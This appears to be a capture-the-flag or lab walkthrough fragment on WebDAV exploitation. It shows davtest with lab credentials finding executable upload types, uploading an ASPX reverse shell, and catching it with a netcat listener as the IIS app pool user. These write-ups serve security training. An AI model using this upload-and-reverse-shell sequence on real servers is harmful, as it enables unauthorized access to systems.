# 6 :80 webdav

```
$ davtest -url http://192.168.136.122 -cleanup -auth fmcsorley:CrabSharkJellyfish192
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://192.168.136.122
********************************************************
NOTE    Random string for this session: gp57Vr2
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://192.168.136.122/DavTestDir_gp57Vr2
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.txt
PUT     cgi     SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.cgi
PUT     php     SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.php
PUT     shtml   SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.shtml
PUT     html    SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.html
PUT     cfm     SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.cfm
PUT     jsp     SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.jsp
PUT     asp     SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.asp
PUT     jhtml   SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.jhtml
PUT     aspx    SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.aspx
PUT     pl      SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.pl
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.txt
EXEC    cgi     FAIL
EXEC    php     FAIL
EXEC    shtml   FAIL
EXEC    html    SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.html
EXEC    cfm     FAIL
EXEC    jsp     FAIL
EXEC    asp     SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.asp
EXEC    jhtml   FAIL
EXEC    aspx    SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2/davtest_gp57Vr2.aspx
EXEC    pl      FAIL
********************************************************
 Cleaning up
DELETE          SUCCEED:        http://192.168.136.122/DavTestDir_gp57Vr2

# using aspx
$ davtest -url http://192.168.136.122 -auth fmcsorley:CrabSharkJellyfish192 -uploadfile ./shell.aspx -uploadloc shell.aspx
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://192.168.136.122
********************************************************
 unless  Uploading file
Upload succeeded: http://192.168.136.122/shell.aspx

http://192.168.136.122/shell.aspx
$ nc -lvnp 445
listening on [any] 445 ...
connect to [192.168.49.136] from (UNKNOWN) [192.168.136.122] 50360
Spawn Shell...
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami && hostname
whoami && hostname
iis apppool\defaultapppool
hutchdc
```
